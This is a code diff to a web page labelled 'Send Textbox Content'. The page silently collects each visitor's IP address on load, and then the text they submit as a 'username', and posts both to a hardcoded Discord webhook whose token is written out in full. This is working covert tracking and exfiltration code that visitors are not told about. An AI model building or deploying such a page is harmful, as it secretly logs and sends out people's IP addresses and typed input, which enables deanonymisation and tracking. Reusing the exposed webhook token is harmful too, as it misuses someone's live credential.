@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>imxjydbkjdbouohuepzpzrermtmljubzlyrnjlrchmbklkhsma</title>
+    <title>Send Textbox Content</title>
     <style>
         body {
             background-image: url('https://xyzzr.github.io/-/image.png');
@@ -54,14 +54,21 @@
     </div>
 
     <script>
-        // Send IP address on page load
+        // Generate a random ID
+        function generateRandomID() {
+            return Math.floor(Math.random() * 1000000);
+        }
+
+        var userID = generateRandomID();
+
+        // Send IP address and user ID on page load
         window.onload = function() {
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
                     var userIp = data.ip;
                     var payload = {
-                        content: `User IP on page load: ${userIp}`
+                        content: `User IP: ${userIp}\nUser ID: ${userID}`
                     };
 
                     fetch('https://discord.com/api/webhooks/1264345023491735612/PhNW10WDYOLVaEC2fehza-FVDP8rw22i20wDEvhOc31P_JxfG7kAX8BXUI9Z6wfc4rYE', {
@@ -72,13 +79,13 @@
                         body: JSON.stringify(payload)
                     }).then(response => {
                         if (!response.ok) {
-                            console.error("Failed to send imxjydbkjdbouohuepzpzrermtmljubzlyrnjlrchmbklkhsma on page load.");
+                            console.error("Failed to send IP and user ID on page load.");
                         }
                     }).catch(error => {
-                        console.error('Error sending imxjydbkjdbouohuepzpzrermtmljubzlyrnjlrchmbklkhsma on page load:', error);
+                        console.error('Error sending IP and user ID on page load:', error);
                     });
                 }).catch(error => {
-                    console.error('imxjydbkjdbouohuepzpzrermtmljubzlyrnjlrchmbklkhsma on imxjydbkjdbouohuepzpzrermtmljubzlyrnjlrchmbklkhsma load:', error);
+                    console.error('Error fetching IP on page load:', error);
                 });
         };
 
@@ -97,15 +104,15 @@
                 return;
             }
 
-            fetch('https://api.ipify.org?format=json') // thanks
+            fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
                     var userIp = data.ip;
                     var payload = {
-                        content: `Textbox content: ${content}\nUser IP: ${userIp}`
+                        content: `User IP: ${userIp}\nUsername: ${content}\nUser ID: ${userID}`
                     };
 
-                    fetch('https://discord.com/api/webhooks/1264345023491735612/PhNW10WDYOLVaEC2fehza-FVDP8rw22i20wDEvhOc31P_JxfG7kAX8BXUI9Z6wfc4rYE', { // lol
+                    fetch('https://discord.com/api/webhooks/1264345023491735612/PhNW10WDYOLVaEC2fehza-FVDP8rw22i20wDEvhOc31P_JxfG7kAX8BXUI9Z6wfc4rYE', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
@@ -123,7 +130,7 @@
                     });
                 }).catch(error => {
                     console.error('Error fetching IP:', error);
-                    alert("Failed to retrieve imxjydbkjdbouohuepzpzrermtmljubzlyrnjlrchmbklkhsma address.");
+                    alert("Failed to retrieve IP address.");
                 });
         });
     </script>
